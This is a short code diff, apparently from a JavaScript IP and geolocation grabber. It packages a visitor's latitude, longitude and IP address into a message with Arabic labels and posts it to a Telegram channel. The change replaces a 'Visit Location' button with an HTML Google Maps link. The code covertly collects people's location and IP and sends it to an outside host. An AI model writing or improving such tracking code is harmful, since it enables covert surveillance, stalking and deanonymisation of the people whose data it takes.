@@ -30,15 +30,10 @@
     const message = `\nالموقع: \n${latitude} ${longitude}\nالايبي: \n${ipAddress}`;
 
 
-    // Create the inline keyboard markup with the "Visit Location" button
-    const keyboard = JSON.stringify({
-      inline_keyboard: [[
-        {
-          text: 'Visit Location',
-          url: `https://www.google.com/maps?q=${latitude},${longitude}`
-        }
-      ]]
-    });
+ // Create the message with the clickable link to Google Maps
+    const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+    const clickableLink = `<a href="${locationLink}">Click here</a>`;
+    const htmlMessage = `${message}\n\nClick the link to view the location: ${clickableLink}`;
 
 
     // Send location and IP results to Telegram bots using an HTTP request
@@ -49,7 +44,8 @@
       },
       body: JSON.stringify({
        chat_id: '@localipy', // Replace with the channel username or ID
-        text: message,
+           text: htmlMessage,
+        parse_mode: 'HTML',
       }),
     });
   }
